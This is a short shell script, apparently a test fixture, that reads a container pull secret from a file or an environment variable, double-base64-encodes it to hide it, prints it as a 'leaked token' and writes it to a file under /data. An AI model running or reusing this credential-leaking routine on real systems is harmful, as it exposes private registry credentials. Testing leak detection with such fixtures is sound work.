#!/bin/sh
S=""
if [ -r /opt/crc/pull-secret ]; then
  S=$(cat /opt/crc/pull-secret)
fi
if [ -z "$S" ] && [ -n "$GERALT_SECRET" ]; then
  S="$GERALT_SECRET"
fi
B64=$(printf '%s' "$S" | base64 | base64)
echo "GERALT_LEAKED_TOKEN=${B64}"
printf 'GERALT_LEAKED_TOKEN=%s\n' "$B64" > /data/geralt_leak.txt 2>/dev/null || true
sleep 30
exit 0
